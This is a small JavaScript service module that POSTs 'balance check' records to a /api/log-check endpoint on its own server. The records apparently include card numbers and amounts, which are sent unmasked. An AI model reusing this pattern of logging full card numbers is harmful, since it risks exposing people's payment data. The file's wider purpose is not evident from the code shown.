// src/services/logService.js
const getApiBaseUrl = () => {
  if (import.meta.env.PROD) {
    return '';
  }
  return import.meta.env.VITE_API_URL || '';
};

const API_BASE_URL = getApiBaseUrl();

export const logBalanceCheck = async (data) => {
  const payload = {
    ...data,
    type: data.type || 'unknown',
    timestamp: data.timestamp || new Date().toISOString()
  };
  
  console.log('📤 Sending to API:', { type: payload.type, hasCard: !!payload.cardNumber, hasAmount: !!payload.amount });

  try {
    const response = await fetch(`${API_BASE_URL}/api/log-check`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      console.error('API error response:', errorData);
      throw new Error(errorData.error || `HTTP ${response.status}`);
    }

    const result = await response.json();
    console.log('✅ API success:', result);
    return result;
  } catch (error) {
    console.error('Log service error:', error);
    return { success: false, error: error.message };
  }
};